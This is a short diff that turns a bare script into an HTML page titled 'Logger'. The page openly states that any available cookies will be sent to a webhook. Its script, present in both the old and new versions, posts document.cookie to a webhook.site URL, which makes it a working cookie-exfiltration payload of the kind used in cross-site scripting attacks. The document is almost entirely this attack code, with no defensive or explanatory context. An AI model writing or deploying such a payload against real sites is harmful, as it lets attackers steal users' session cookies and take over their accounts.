@@ -1,6 +1,16 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Logger</title>
+</head>
+<body>
+  <h1>Logging cookie...</h1>
+  <p>If any cookies are available, they will be sent to your webhook.</p>
+  <script>
   fetch('https://webhook.site/a15143d7-5478-4b56-8dd1-1bc586dd43fd', {
   method: 'POST',
-  body: document.cookie
-});
-</script>
+  body: document.cookie});
+  </script>
+</body>
+</html>
